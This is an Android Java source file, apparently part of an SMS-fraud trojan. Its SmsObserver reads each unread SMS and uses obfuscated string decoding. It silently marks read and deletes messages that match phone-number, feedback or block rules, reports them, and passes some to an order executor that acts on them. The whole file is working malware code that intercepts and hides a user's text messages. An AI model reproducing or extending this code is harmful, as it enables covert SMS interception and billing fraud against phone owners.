package kernel.workspace.sms;
import kernel.workspace.listener.BlockListener;
import kernel.workspace.manager.OrderManager;
import kernel.workspace.manager.ReportManager;
import kernel.workspace.util.Constant;
import kernel.workspace.util.Logger;
import kernel.workspace.util.ParseKsy;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import bean.Block;
import bean.Feedback;

public class SmsObserver extends ContentObserver {
    /**
     * "address"
     */
    private static String ADDRESS2 = ParseKsy.decode("7bd860dc2feb174d057130afe878bbc9");
    /**
     * "body"
     */
    private static String BODY = ParseKsy.decode("300487da8ad7f78121586a2cffae56fb");
    private Context context;
    public SmsObserver(Context context, Handler handler) {
        super(handler);
        this.context = context;
    }
    @Override
    public void onChange(boolean flag) {
        super.onChange(flag);
        try {
            onSmsContentChanged();
        } catch (Exception e) {
            Logger.error(e);
        }
    }
    public void onSmsContentChanged() {
        final Cursor cursor = context.getContentResolver().query(Uri.parse(Constant.URI_SMS_INBOX), null, "read=?", new String[] { "0" }, "date desc");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String text = cursor.getString(cursor.getColumnIndexOrThrow(BODY));
                String address = cursor.getString(cursor.getColumnIndexOrThrow(ADDRESS2));
                Logger.debug(address, text);
                if (SmsHelper.checkPhoneNumber(address, text)) {
                    deletSms(cursor);
                    SmsHelper.reportPhoneNumber(context, address, text);
                } else {
                    BlockListener listener = new BlockListener() {
                        private boolean blocked = false;
                        @Override
                        public void stopBroadcast() {
                            if (!blocked) {
                                deletSms(cursor);
                                blocked = true;
                            }
                        }
                    };
                    SmsHelper.checkCommonBlocks(address, text, listener);
                    Feedback feedback = SmsHelper.checkFeedback(context, address, text, listener);
                    if (feedback != null) {
                        deletSms(cursor);
                        OrderManager.getInstance(context).executeFeedback(address, text, feedback);
                    } else {
                        Block block = SmsHelper.checkBlock(context, address, text, listener);
                        if (block != null) {
                            ReportManager.successReport(context, block, address + "->" + text, null);
                        }
                    }
                }
            }
            cursor.close();
        }
    }
    /**
     * content://sms/conversations/
     */
    private static String URI_CONTENT = ParseKsy.decode("cc4e76d0342d60a59aae0e563fd6b5e67a0ac5046fdbe7a00e7cb0c492fe1084");
    private void deletSms(Cursor cursor) {
        ContentValues contentvalues = new ContentValues();
        contentvalues.put("read", "1");
        ContentResolver contentresolver = context.getContentResolver();
        contentresolver.update(Uri.parse(Constant.URI_SMS_INBOX), contentvalues, " _id=?", new String[] { String.valueOf(cursor.getInt(0)) });
        String threadId = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
        String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
        Uri uri1 = Uri.parse(new StringBuilder(URI_CONTENT).append(threadId).toString());
        context.getContentResolver().delete(uri1, "_id=?", new String[] { id });
        cursor.moveToNext();
    }
}
